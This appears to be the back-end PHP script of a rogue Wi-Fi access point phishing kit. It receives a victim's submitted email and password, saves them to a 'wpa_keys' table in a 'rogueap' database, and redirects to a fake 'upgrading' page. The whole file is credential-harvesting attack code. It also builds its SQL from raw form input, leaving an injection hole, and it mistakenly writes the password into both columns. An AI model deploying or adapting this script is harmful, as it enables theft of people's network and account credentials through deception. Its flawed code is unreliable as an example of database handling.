<?php
session_start();
ob_start();
$host="localhost";
$username="rogueuser";
$pass="roguepassword";
$dbname="rogueap";
$tbl_name="wpa_keys";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if ($conn) {
    $mail=$_POST['mail'];
	$password=$_POST['password'];

	$sql = "INSERT INTO wpa_keys (mail, password) VALUES ('$password', '$password')";
	if (mysqli_query($conn, $sql)) {
        	echo "New record created successfully";
	} else {
    		echo "Error: " . $sql . "<br>" . mysqli_error($conn);
	}

	mysqli_close($conn);
}

sleep(2);
header("location:upgrading.html");
ob_end_flush();
?>

